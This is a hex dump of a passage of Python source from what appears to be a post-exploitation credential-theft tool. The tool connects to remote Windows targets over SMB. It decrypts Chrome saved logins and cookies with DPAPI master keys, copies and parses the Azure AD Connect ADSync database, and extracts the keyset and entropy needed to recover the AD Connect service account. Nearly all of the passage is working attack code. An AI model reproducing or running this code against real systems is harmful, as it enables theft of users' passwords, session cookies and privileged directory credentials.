+000071b0: 676e 616d 655d 5b27 7061 7468 275d 203d  gname]['path'] =
+000071c0: 206c 6f63 616c 6669 6c65 0a09 0909 0909   localfile......
+000071d0: 0909 0909 6c6f 6769 6e73 203d 206d 7943  ....logins = myC
+000071e0: 6872 6f6d 6553 6563 7265 7473 2e64 6563  hromeSecrets.dec
+000071f0: 7279 7074 5f63 6872 6f6d 655f 4c6f 6769  rypt_chrome_Logi
+00007200: 6e44 6174 6128 290a 0909 0909 0909 0909  nData().........
+00007210: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+00007220: 6e61 6d65 5d5b 2773 6563 7265 7427 5d20  name]['secret'] 
+00007230: 3d20 6c6f 6769 6e73 0a09 0909 0909 0909  = logins........
+00007240: 0909 6966 206c 6f67 696e 7320 6973 206e  ..if logins is n
+00007250: 6f74 204e 6f6e 653a 0a09 0909 0909 0909  ot None:........
+00007260: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
+00007270: 6e67 6e61 6d65 5d5b 2773 7461 7475 7327  ngname]['status'
+00007280: 5d20 3d20 2764 6563 7279 7074 6564 270a  ] = 'decrypted'.
+00007290: 0909 0909 0909 0909 6578 6365 7074 2045  ........except E
+000072a0: 7863 6570 7469 6f6e 2061 7320 6578 3a0a  xception as ex:.
+000072b0: 0909 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
+000072c0: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
+000072d0: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
+000072e0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+000072f0: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
+00007300: 4e49 4e47 7d45 7863 6570 7469 6f6e 2064  NING}Exception d
+00007310: 6563 7279 7074 696e 6720 6c6f 6769 6e64  ecrypting logind
+00007320: 6174 6120 666f 7220 4348 524f 4d45 207b  ata for CHROME {
+00007330: 7573 6572 2e75 7365 726e 616d 657d 207b  user.username} {
+00007340: 6c6f 6361 6c66 696c 657d 207b 6263 6f6c  localfile} {bcol
+00007350: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
+00007360: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+00007370: 672e 6465 6275 6728 6578 290a 0909 0909  g.debug(ex).....
+00007380: 0909 0969 6620 6d79 5f62 6c6f 625f 7479  ...if my_blob_ty
+00007390: 7065 203d 3d20 2743 6872 6f6d 6543 6f6f  pe == 'ChromeCoo
+000073a0: 6b69 6573 273a 0a09 0909 0909 0909 0974  kies':.........t
+000073b0: 7279 3a0a 0909 0909 0909 0909 096d 7943  ry:..........myC
+000073c0: 6872 6f6d 6553 6563 7265 7473 2e63 6f6f  hromeSecrets.coo
+000073d0: 6b69 655f 7061 7468 203d 206c 6f63 616c  kie_path = local
+000073e0: 6669 6c65 0a09 0909 0909 0909 0909 7573  file..........us
+000073f0: 6572 2e66 696c 6573 5b6c 6f6e 676e 616d  er.files[longnam
+00007400: 655d 203d 207b 7d0a 0909 0909 0909 0909  e] = {}.........
+00007410: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+00007420: 6e61 6d65 5d5b 2774 7970 6527 5d20 3d20  name]['type'] = 
+00007430: 6d79 5f62 6c6f 625f 7479 7065 0a09 0909  my_blob_type....
+00007440: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
+00007450: 5b6c 6f6e 676e 616d 655d 5b27 7374 6174  [longname]['stat
+00007460: 7573 275d 203d 2027 656e 6372 7970 7465  us'] = 'encrypte
+00007470: 6427 0a09 0909 0909 0909 0909 7573 6572  d'..........user
+00007480: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
+00007490: 5b27 7061 7468 275d 203d 206c 6f63 616c  ['path'] = local
+000074a0: 6669 6c65 0a09 0909 0909 0909 0909 636f  file..........co
+000074b0: 6f6b 6965 7320 3d20 6d79 4368 726f 6d65  okies = myChrome
+000074c0: 5365 6372 6574 732e 6465 6372 7970 745f  Secrets.decrypt_
+000074d0: 6368 726f 6d65 5f43 6f6f 6b69 6544 6174  chrome_CookieDat
+000074e0: 6128 290a 0909 0909 0909 0909 0975 7365  a()..........use
+000074f0: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
+00007500: 5d5b 2773 6563 7265 7427 5d20 3d20 636f  ]['secret'] = co
+00007510: 6f6b 6965 730a 0909 0909 0909 0909 0969  okies..........i
+00007520: 6620 636f 6f6b 6965 7320 6973 206e 6f74  f cookies is not
+00007530: 204e 6f6e 653a 0a09 0909 0909 0909 0909   None:..........
+00007540: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+00007550: 6e61 6d65 5d5b 2773 7461 7475 7327 5d20  name]['status'] 
+00007560: 3d20 2764 6563 7279 7074 6564 270a 0909  = 'decrypted'...
+00007570: 0909 0909 0909 6578 6365 7074 2045 7863  ......except Exc
+00007580: 6570 7469 6f6e 2061 7320 6578 3a0a 0909  eption as ex:...
+00007590: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
+000075a0: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
+000075b0: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
+000075c0: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
+000075d0: 5d20 7b62 636f 6c6f 7273 2e57 4152 4e49  ] {bcolors.WARNI
+000075e0: 4e47 7d45 7863 6570 7469 6f6e 2064 6563  NG}Exception dec
+000075f0: 7279 7074 696e 6720 436f 6f6b 6965 4461  rypting CookieDa
+00007600: 7461 2066 6f72 2043 4852 4f4d 4520 7b75  ta for CHROME {u
+00007610: 7365 722e 7573 6572 6e61 6d65 7d20 7b6c  ser.username} {l
+00007620: 6f63 616c 6669 6c65 7d20 7b62 636f 6c6f  ocalfile} {bcolo
+00007630: 7273 2e45 4e44 437d 2229 0a09 0909 0909  rs.ENDC}")......
+00007640: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+00007650: 2e64 6562 7567 2865 7829 0a09 0909 0909  .debug(ex)......
+00007660: 0909 6966 206d 795f 626c 6f62 5f74 7970  ..if my_blob_typ
+00007670: 6520 3d3d 2027 4368 726f 6d65 5665 7273  e == 'ChromeVers
+00007680: 696f 6e27 3a0a 0909 0909 0909 0909 7472  ion':.........tr
+00007690: 793a 0a09 0909 0909 0909 0909 6d79 4368  y:..........myCh
+000076a0: 726f 6d65 5365 6372 6574 732e 7665 7273  romeSecrets.vers
+000076b0: 696f 6e5f 7061 7468 203d 206c 6f63 616c  ion_path = local
+000076c0: 6669 6c65 0a09 0909 0909 0909 0909 7573  file..........us
+000076d0: 6572 2e66 696c 6573 5b6c 6f6e 676e 616d  er.files[longnam
+000076e0: 655d 203d 207b 7d0a 0909 0909 0909 0909  e] = {}.........
+000076f0: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+00007700: 6e61 6d65 5d5b 2774 7970 6527 5d20 3d20  name]['type'] = 
+00007710: 6d79 5f62 6c6f 625f 7479 7065 0a09 0909  my_blob_type....
+00007720: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
+00007730: 5b6c 6f6e 676e 616d 655d 5b27 7374 6174  [longname]['stat
+00007740: 7573 275d 203d 2027 656e 6372 7970 7465  us'] = 'encrypte
+00007750: 6427 0a09 0909 0909 0909 0909 7573 6572  d'..........user
+00007760: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
+00007770: 5b27 7061 7468 275d 203d 206c 6f63 616c  ['path'] = local
+00007780: 6669 6c65 0a09 0909 0909 0909 0909 636f  file..........co
+00007790: 6f6b 6965 7320 3d20 6d79 4368 726f 6d65  okies = myChrome
+000077a0: 5365 6372 6574 732e 6765 745f 6368 726f  Secrets.get_chro
+000077b0: 6d65 5f56 6572 7369 6f6e 2829 0a09 0909  me_Version()....
+000077c0: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
+000077d0: 5b6c 6f6e 676e 616d 655d 5b27 7365 6372  [longname]['secr
+000077e0: 6574 275d 203d 2063 6f6f 6b69 6573 0a09  et'] = cookies..
+000077f0: 0909 0909 0909 0909 6966 2063 6f6f 6b69  ........if cooki
+00007800: 6573 2069 7320 6e6f 7420 4e6f 6e65 3a0a  es is not None:.
+00007810: 0909 0909 0909 0909 0909 7573 6572 2e66  ..........user.f
+00007820: 696c 6573 5b6c 6f6e 676e 616d 655d 5b27  iles[longname]['
+00007830: 7374 6174 7573 275d 203d 2027 6465 6372  status'] = 'decr
+00007840: 7970 7465 6427 0a09 0909 0909 0909 0965  ypted'.........e
+00007850: 7863 6570 7420 4578 6365 7074 696f 6e20  xcept Exception 
+00007860: 6173 2065 783a 0a09 0909 0909 0909 0909  as ex:..........
+00007870: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+00007880: 7567 280a 0909 0909 0909 0909 0909 6622  ug(...........f"
+00007890: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+000078a0: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
+000078b0: 6f72 732e 5741 524e 494e 477d 4578 6365  ors.WARNING}Exce
+000078c0: 7074 696f 6e20 6465 6372 7970 7469 6e67  ption decrypting
+000078d0: 2043 6f6f 6b69 6544 6174 6120 666f 7220   CookieData for 
+000078e0: 4348 524f 4d45 207b 7573 6572 2e75 7365  CHROME {user.use
+000078f0: 726e 616d 657d 207b 6c6f 6361 6c66 696c  rname} {localfil
+00007900: 657d 207b 6263 6f6c 6f72 732e 454e 4443  e} {bcolors.ENDC
+00007910: 7d22 290a 0909 0909 0909 0909 0973 656c  }")..........sel
+00007920: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+00007930: 6578 290a 0a09 0909 0909 0965 7863 6570  ex)........excep
+00007940: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
+00007950: 783a 0a09 0909 0909 0909 7365 6c66 2e6c  x:........self.l
+00007960: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
+00007970: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
+00007980: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+00007990: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
+000079a0: 494e 477d 4578 6365 7074 696f 6e20 6465  ING}Exception de
+000079b0: 6372 7970 7469 6e67 2042 6c6f 6220 666f  crypting Blob fo
+000079c0: 7220 7b6c 6f63 616c 6669 6c65 7d20 7769  r {localfile} wi
+000079d0: 7468 204d 6173 7465 726b 6579 7b62 636f  th Masterkey{bco
+000079e0: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+000079f0: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+00007a00: 2e64 6562 7567 2865 7829 0a0a 0964 6566  .debug(ex)...def
+00007a10: 2067 6574 4d64 6244 6174 6128 7365 6c66   getMdbData(self
+00007a20: 293a 0a09 0974 7279 3a0a 0909 0972 6574  ):...try:....ret
+00007a30: 7572 6e20 7365 6c66 2e67 6574 4d64 6244  urn self.getMdbD
+00007a40: 6174 6132 2829 0a09 0965 7863 6570 7420  ata2()...except 
+00007a50: 556e 6963 6f64 6544 6563 6f64 6545 7272  UnicodeDecodeErr
+00007a60: 6f72 3a0a 0909 0972 6574 7572 6e20 7365  or:....return se
+00007a70: 6c66 2e67 6574 4d64 6244 6174 6132 2827  lf.getMdbData2('
+00007a80: 7574 662d 3136 2d6c 6527 290a 0a09 6465  utf-16-le')...de
+00007a90: 6620 6765 744d 6462 4461 7461 3228 7365  f getMdbData2(se
+00007aa0: 6c66 2c20 636f 6465 633d 2775 7466 2d38  lf, codec='utf-8
+00007ab0: 2729 3a0a 0909 7472 793a 0a09 0909 6f75  '):...try:....ou
+00007ac0: 7420 3d20 7b0a 0909 0909 2763 7279 7074  t = {.....'crypt
+00007ad0: 6564 7265 636f 7264 7327 3a20 5b5d 2c0a  edrecords': [],.
+00007ae0: 0909 0909 2778 6d6c 6461 7461 273a 205b  ....'xmldata': [
+00007af0: 5d0a 0909 097d 0a09 0909 6b65 7964 6174  ]....}....keydat
+00007b00: 6120 3d20 4e6f 6e65 0a09 0909 230a 0909  a = None....#...
+00007b10: 0923 2073 656c 662e 6f70 7469 6f6e 732e  .# self.options.
+00007b20: 6672 6f6d 5f66 696c 653d 2761 6473 796e  from_file='adsyn
+00007b30: 635f 6578 706f 7274 270a 0a09 0909 6966  c_export'.....if
+00007b40: 2073 656c 662e 6f70 7469 6f6e 732e 6672   self.options.fr
+00007b50: 6f6d 5f66 696c 653a 0a09 0909 096c 6f67  om_file:.....log
+00007b60: 6769 6e67 2e69 6e66 6f28 274c 6f61 6469  ging.info('Loadi
+00007b70: 6e67 2063 6f6e 6669 6775 7261 7469 6f6e  ng configuration
+00007b80: 2064 6174 6120 6672 6f6d 2025 7320 6f6e   data from %s on
+00007b90: 2066 696c 6573 7973 7465 6d27 2c20 7365   filesystem', se
+00007ba0: 6c66 2e6f 7074 696f 6e73 2e66 726f 6d5f  lf.options.from_
+00007bb0: 6669 6c65 290a 0909 0909 696e 6669 6c65  file).....infile
+00007bc0: 203d 2063 6f64 6563 732e 6f70 656e 2873   = codecs.open(s
+00007bd0: 656c 662e 6f70 7469 6f6e 732e 6672 6f6d  elf.options.from
+00007be0: 5f66 696c 652c 2027 7227 2c20 636f 6465  _file, 'r', code
+00007bf0: 6329 0a09 0909 0965 6e75 6d74 6172 6765  c).....enumtarge
+00007c00: 7420 3d20 696e 6669 6c65 0a09 0909 656c  t = infile....el
+00007c10: 7365 3a0a 0909 0909 6c6f 6767 696e 672e  se:.....logging.
+00007c20: 696e 666f 2827 5175 6572 7969 6e67 2064  info('Querying d
+00007c30: 6174 6162 6173 6520 666f 7220 636f 6e66  atabase for conf
+00007c40: 6967 7572 6174 696f 6e20 6461 7461 2729  iguration data')
+00007c50: 0a09 0909 0964 6270 6174 6820 3d20 6f73  .....dbpath = os
+00007c60: 2e70 6174 682e 6a6f 696e 286f 732e 6765  .path.join(os.ge
+00007c70: 7463 7764 2829 2c20 7222 4144 5379 6e63  tcwd(), r"ADSync
+00007c80: 2e6d 6466 2229 0a09 0909 096f 7574 7075  .mdf").....outpu
+00007c90: 7420 3d20 7375 6270 726f 6365 7373 2e50  t = subprocess.P
+00007ca0: 6f70 656e 285b 2241 4453 796e 6351 7565  open(["ADSyncQue
+00007cb0: 7279 2e65 7865 222c 2064 6270 6174 685d  ry.exe", dbpath]
+00007cc0: 2c20 7374 646f 7574 3d73 7562 7072 6f63  , stdout=subproc
+00007cd0: 6573 732e 5049 5045 292e 636f 6d6d 756e  ess.PIPE).commun
+00007ce0: 6963 6174 6528 295b 305d 0a09 0909 0965  icate()[0].....e
+00007cf0: 6e75 6d74 6172 6765 7420 3d20 6f75 7470  numtarget = outp
+00007d00: 7574 2e73 706c 6974 2827 5c6e 2729 0a0a  ut.split('\n')..
+00007d10: 0909 0923 2323 2323 5445 4d50 0a09 0909  ...#####TEMP....
+00007d20: 2320 6c6f 6767 696e 672e 696e 666f 2827  # logging.info('
+00007d30: 4c6f 6164 696e 6720 636f 6e66 6967 7572  Loading configur
+00007d40: 6174 696f 6e20 6461 7461 2066 726f 6d20  ation data from 
+00007d50: 2573 206f 6e20 6669 6c65 7379 7374 656d  %s on filesystem
+00007d60: 272c 2073 656c 662e 5f5f 6f70 7469 6f6e  ', self.__option
+00007d70: 732e 6672 6f6d 5f66 696c 6529 0a09 0909  s.from_file)....
+00007d80: 2320 696e 6669 6c65 203d 2063 6f64 6563  # infile = codec
+00007d90: 732e 6f70 656e 2827 6164 7379 6e63 5f65  s.open('adsync_e
+00007da0: 7870 6f72 7427 2c20 2772 272c 2063 6f64  xport', 'r', cod
+00007db0: 6563 290a 0909 0923 2065 6e75 6d74 6172  ec)....# enumtar
+00007dc0: 6765 7420 3d20 696e 6669 6c65 0a09 0909  get = infile....
+00007dd0: 2323 2323 2323 0a0a 0909 0966 6f72 206c  ######.....for l
+00007de0: 696e 6520 696e 2065 6e75 6d74 6172 6765  ine in enumtarge
+00007df0: 743a 0a09 0909 0974 7279 3a0a 0909 0909  t:.....try:.....
+00007e00: 096c 7479 7065 2c20 6461 7461 203d 206c  .ltype, data = l
+00007e10: 696e 652e 7374 7269 7028 292e 7370 6c69  ine.strip().spli
+00007e20: 7428 273a 2027 290a 0909 0909 6578 6365  t(': ').....exce
+00007e30: 7074 2056 616c 7565 4572 726f 723a 0a09  pt ValueError:..
+00007e40: 0909 0909 636f 6e74 696e 7565 0a09 0909  ....continue....
+00007e50: 096c 7479 7065 203d 206c 7479 7065 2e72  .ltype = ltype.r
+00007e60: 6570 6c61 6365 2875 275c 7566 6566 6627  eplace(u'\ufeff'
+00007e70: 2c20 7527 2729 0a09 0909 0969 6620 6c74  , u'').....if lt
+00007e80: 7970 652e 6c6f 7765 7228 2920 3d3d 2027  ype.lower() == '
+00007e90: 7265 636f 7264 273a 0a09 0909 0909 786d  record':......xm
+00007ea0: 6c64 6174 612c 2063 7279 7074 6564 6461  ldata, cryptedda
+00007eb0: 7461 203d 2064 6174 612e 7370 6c69 7428  ta = data.split(
+00007ec0: 273b 2729 0a09 0909 0909 6f75 745b 2763  ';')......out['c
+00007ed0: 7279 7074 6564 7265 636f 7264 7327 5d2e  ryptedrecords'].
+00007ee0: 6170 7065 6e64 2863 7279 7074 6564 6461  append(cryptedda
+00007ef0: 7461 290a 0909 0909 096f 7574 5b27 786d  ta)......out['xm
+00007f00: 6c64 6174 6127 5d2e 6170 7065 6e64 2878  ldata'].append(x
+00007f10: 6d6c 6461 7461 290a 0909 0909 2320 7072  mldata).....# pr
+00007f20: 696e 7428 6622 7265 636f 7264 2066 6f75  int(f"record fou
+00007f30: 6e64 203a 207b 786d 6c64 6174 617d 2229  nd : {xmldata}")
+00007f40: 0a0a 0909 0909 6966 206c 7479 7065 2e6c  ......if ltype.l
+00007f50: 6f77 6572 2829 203d 3d20 2763 6f6e 6669  ower() == 'confi
+00007f60: 6727 3a0a 0909 0909 0969 6e73 7461 6e63  g':......instanc
+00007f70: 652c 206b 6579 7365 745f 6964 2c20 656e  e, keyset_id, en
+00007f80: 7472 6f70 7920 3d20 6461 7461 2e73 706c  tropy = data.spl
+00007f90: 6974 2827 3b27 290a 0909 0909 096f 7574  it(';')......out
+00007fa0: 5b27 696e 7374 616e 6365 275d 203d 2069  ['instance'] = i
+00007fb0: 6e73 7461 6e63 650a 0909 0909 096f 7574  nstance......out
+00007fc0: 5b27 6b65 7973 6574 5f69 6427 5d20 3d20  ['keyset_id'] = 
+00007fd0: 6b65 7973 6574 5f69 640a 0909 0909 096f  keyset_id......o
+00007fe0: 7574 5b27 656e 7472 6f70 7927 5d20 3d20  ut['entropy'] = 
+00007ff0: 656e 7472 6f70 790a 0909 0923 2069 6620  entropy....# if 
+00008000: 7365 6c66 2e5f 5f6f 7074 696f 6e73 2e66  self.__options.f
+00008010: 726f 6d5f 6669 6c65 3a0a 0909 0923 0969  rom_file:....#.i
+00008020: 6e66 696c 652e 636c 6f73 6528 290a 0909  nfile.close()...
+00008030: 0923 2043 6865 636b 2069 6620 616c 6c20  .# Check if all 
+00008040: 7661 6c75 6573 2061 7265 2069 6e20 7468  values are in th
+00008050: 6520 6f75 7464 6174 610a 0909 0972 6571  e outdata....req
+00008060: 7569 7265 6420 3d20 5b27 6372 7970 7465  uired = ['crypte
+00008070: 6472 6563 6f72 6473 272c 2027 786d 6c64  drecords', 'xmld
+00008080: 6174 6127 2c20 2769 6e73 7461 6e63 6527  ata', 'instance'
+00008090: 2c20 276b 6579 7365 745f 6964 272c 2027  , 'keyset_id', '
+000080a0: 656e 7472 6f70 7927 5d0a 0909 0966 6f72  entropy']....for
+000080b0: 206f 7074 696f 6e20 696e 2072 6571 7569   option in requi
+000080c0: 7265 643a 0a09 0909 0969 6620 6e6f 7420  red:.....if not 
+000080d0: 6f70 7469 6f6e 2069 6e20 6f75 743a 0a09  option in out:..
+000080e0: 0909 0909 6c6f 6767 696e 672e 6572 726f  ....logging.erro
+000080f0: 7228 0a09 0909 0909 0927 4d69 7373 696e  r(.......'Missin
+00008100: 6720 6461 7461 2066 726f 6d20 6461 7461  g data from data
+00008110: 6261 7365 2e20 4f70 7469 6f6e 2025 7320  base. Option %s 
+00008120: 636f 756c 6420 6e6f 7420 6265 2065 7874  could not be ext
+00008130: 7261 6374 6564 2e20 4368 6563 6b20 796f  racted. Check yo
+00008140: 7572 2064 6174 6162 6173 6520 6f72 206f  ur database or o
+00008150: 7574 7075 7420 6669 6c65 2e27 2c0a 0909  utput file.',...
+00008160: 0909 0909 6f70 7469 6f6e 290a 0909 0909  ....option).....
+00008170: 0972 6574 7572 6e20 4e6f 6e65 0a09 0909  .return None....
+00008180: 7265 7475 726e 206f 7574 0a09 0965 7863  return out...exc
+00008190: 6570 7420 4578 6365 7074 696f 6e20 6173  ept Exception as
+000081a0: 2065 783a 0a09 0909 7365 6c66 2e6c 6f67   ex:....self.log
+000081b0: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
+000081c0: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
+000081d0: 2e74 6172 6765 745f 6970 7d5d 207b 6263  .target_ip}] {bc
+000081e0: 6f6c 6f72 732e 5741 524e 494e 477d 4578  olors.WARNING}Ex
+000081f0: 6365 7074 696f 6e20 696e 2050 6172 7369  ception in Parsi
+00008200: 6e67 2064 6174 6162 6173 6520 3a20 506c  ng database : Pl
+00008210: 6561 7365 206d 616e 7561 6c79 2072 756e  ease manualy run
+00008220: 2041 4453 796e 6351 7565 7279 2e65 7865   ADSyncQuery.exe
+00008230: 2041 4453 796e 632e 6d64 6620 3e20 6164   ADSync.mdf > ad
+00008240: 7379 6e63 5f65 7870 6f72 7420 6f6e 2061  sync_export on a
+00008250: 2077 696e 646f 7773 2065 6e76 2077 6974   windows env wit
+00008260: 6820 4d53 5351 4c20 7375 7070 6f72 747b  h MSSQL support{
+00008270: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
+00008280: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00008290: 6465 6275 6728 6578 290a 0a09 6465 6620  debug(ex)...def 
+000082a0: 4765 745f 4144 5f43 6f6e 6e65 6374 2873  Get_AD_Connect(s
+000082b0: 656c 662c 2075 7365 722c 206c 6f63 616c  elf, user, local
+000082c0: 6669 6c65 2c20 6461 7461 293a 0a09 0923  file, data):...#
+000082d0: 204c 6f63 616c 2044 5041 5049 2065 7874   Local DPAPI ext
+000082e0: 7261 6374 6564 2064 6174 610a 0909 696e  racted data...in
+000082f0: 666f 203d 2022 220a 0909 7061 7274 7320  fo = ""...parts 
+00008300: 3d20 6461 7461 5b27 5461 7267 6574 275d  = data['Target']
+00008310: 2e64 6563 6f64 6528 2775 7466 2d31 366c  .decode('utf-16l
+00008320: 6527 295b 3a2d 315d 2e73 706c 6974 2827  e')[:-1].split('
+00008330: 5f27 290a 0909 6c6f 6361 6c42 6c6f 6264  _')...localBlobd
+00008340: 6174 6173 203d 207b 0a09 0909 2769 6e73  atas = {....'ins
+00008350: 7461 6e63 6569 6427 3a20 7061 7274 735b  tanceid': parts[
+00008360: 335d 5b31 3a2d 315d 2e6c 6f77 6572 2829  3][1:-1].lower()
+00008370: 2c0a 0909 0927 6b65 7973 6574 5f69 6427  ,....'keyset_id'
+00008380: 3a20 7061 7274 735b 345d 2c0a 0909 0927  : parts[4],....'
+00008390: 6461 7461 273a 2064 6174 615b 2755 6e6b  data': data['Unk
+000083a0: 6e6f 776e 3327 5d0a 0909 7d0a 0909 2320  nown3']...}...# 
+000083b0: 7072 696e 7428 6c6f 6361 6c42 6c6f 6264  print(localBlobd
+000083c0: 6174 6173 290a 0a09 0923 2041 4443 6f6e  atas)....# ADCon
+000083d0: 6e65 6374 2044 6174 6162 6173 6520 6461  nect Database da
+000083e0: 7461 0a09 096c 6f67 6769 6e67 2e64 6562  ta...logging.deb
+000083f0: 7567 2866 225b 7b73 656c 662e 6f70 7469  ug(f"[{self.opti
+00008400: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
+00008410: 7b62 636f 6c6f 7273 2e4f 4b42 4c55 457d  {bcolors.OKBLUE}
+00008420: 2054 7279 696e 6720 746f 2067 6574 2041   Trying to get A
+00008430: 4443 6f6e 6e65 6374 2061 6363 6f75 6e74  DConnect account
+00008440: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
+00008450: 0a09 0974 7279 3a0a 0909 0923 2053 746f  ...try:....# Sto
+00008460: 7020 5365 7276 6963 6520 2f20 446f 776e  p Service / Down
+00008470: 6c6f 6164 2044 4220 2f20 5374 6172 7420  load DB / Start 
+00008480: 4442 0a09 0909 6d79 4144 5352 656d 6f74  DB....myADSRemot
+00008490: 654f 7073 203d 2041 4453 5265 6d6f 7465  eOps = ADSRemote
+000084a0: 4f70 6572 6174 696f 6e73 2873 6d62 436f  Operations(smbCo
+000084b0: 6e6e 6563 7469 6f6e 3d73 656c 662e 736d  nnection=self.sm
+000084c0: 622c 2064 6f4b 6572 6265 726f 733d 4661  b, doKerberos=Fa
+000084d0: 6c73 6529 0a09 0909 6d79 4144 5352 656d  lse)....myADSRem
+000084e0: 6f74 654f 7073 2e67 6174 6865 7241 6453  oteOps.gatherAdS
+000084f0: 796e 634d 6462 2829 0a09 0909 2320 6669  yncMdb()....# fi
+00008500: 6c65 735f 746f 5f64 6c3d 5b27 5072 6f67  les_to_dl=['Prog
+00008510: 7261 6d20 4669 6c65 735c 5c4d 6963 726f  ram Files\\Micro
+00008520: 736f 6674 2041 7a75 7265 2041 4420 5379  soft Azure AD Sy
+00008530: 6e63 5c5c 4461 7461 5c5c 4144 5379 6e63  nc\\Data\\ADSync
+00008540: 2e6d 6466 272c 2750 726f 6772 616d 2046  .mdf','Program F
+00008550: 696c 6573 5c5c 4d69 6372 6f73 6f66 7420  iles\\Microsoft 
+00008560: 417a 7572 6520 4144 2053 796e 635c 5c44  Azure AD Sync\\D
+00008570: 6174 615c 5c41 4453 796e 635f 6c6f 672e  ata\\ADSync_log.
+00008580: 6c64 6627 5d0a 0909 096d 6462 6461 7461  ldf']....mdbdata
+00008590: 203d 2073 656c 662e 6765 744d 6462 4461   = self.getMdbDa
+000085a0: 7461 2829 0a09 0909 6966 206d 6462 6461  ta()....if mdbda
+000085b0: 7461 2069 7320 4e6f 6e65 3a0a 0909 0909  ta is None:.....
+000085c0: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
+000085d0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+000085e0: 6172 6765 745f 6970 7d5d 2043 6f75 6c64  arget_ip}] Could
+000085f0: 206e 6f74 2065 7874 7261 6374 2072 6571   not extract req
+00008600: 7569 7265 6420 6461 7461 6261 7365 2069  uired database i
+00008610: 6e66 6f72 6d61 7469 6f6e 2e20 4578 6974  nformation. Exit
+00008620: 696e 6722 290a 0909 0909 7265 7475 726e  ing").....return
+00008630: 0a09 0923 2070 7269 6e74 286d 6462 6461  ...# print(mdbda
+00008640: 7461 290a 0909 6578 6365 7074 2045 7863  ta)...except Exc
+00008650: 6570 7469 6f6e 2061 7320 6578 3a0a 0909  eption as ex:...
+00008660: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+00008670: 6275 6728 0a09 0909 0966 225b 7b73 656c  bug(.....f"[{sel
+00008680: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+00008690: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e57  _ip}] {bcolors.W
+000086a0: 4152 4e49 4e47 7d45 7863 6570 7469 6f6e  ARNING}Exception
+000086b0: 2069 6e20 4144 5352 656d 6f74 654f 7065   in ADSRemoteOpe
+000086c0: 7261 7469 6f6e 7320 317b 6263 6f6c 6f72  rations 1{bcolor
+000086d0: 732e 454e 4443 7d22 290a 0909 0973 656c  s.ENDC}")....sel
+000086e0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+000086f0: 6578 290a 0a09 0972 6573 756c 7420 3d20  ex)....result = 
+00008700: 6c6f 6361 6c42 6c6f 6264 6174 6173 0a09  localBlobdatas..
+00008710: 0969 6620 7265 7375 6c74 2069 7320 6e6f  .if result is no
+00008720: 7420 4e6f 6e65 3a0a 0909 0969 6620 7265  t None:....if re
+00008730: 7375 6c74 5b27 6b65 7973 6574 5f69 6427  sult['keyset_id'
+00008740: 5d20 213d 206d 6462 6461 7461 5b27 6b65  ] != mdbdata['ke
+00008750: 7973 6574 5f69 6427 5d20 6f72 2072 6573  yset_id'] or res
+00008760: 756c 745b 2769 6e73 7461 6e63 6569 6427  ult['instanceid'
+00008770: 5d20 213d 206d 6462 6461 7461 5b27 696e  ] != mdbdata['in
+00008780: 7374 616e 6365 275d 3a0a 0909 0909 6c6f  stance']:.....lo
+00008790: 6767 696e 672e 6465 6275 6728 2746 6f75  gging.debug('Fou
+000087a0: 6e64 206b 6579 7365 7420 2573 2069 6e73  nd keyset %s ins
+000087b0: 7461 6e63 6520 2573 2c20 6275 7420 6e65  tance %s, but ne
+000087c0: 6564 206b 6579 7365 7420 2573 2069 6e73  ed keyset %s ins
+000087d0: 7461 6e63 6520 2573 2e20 5472 7969 6e67  tance %s. Trying
+000087e0: 206e 6578 7427 2c0a 0909 0909 0909 0920   next',........ 
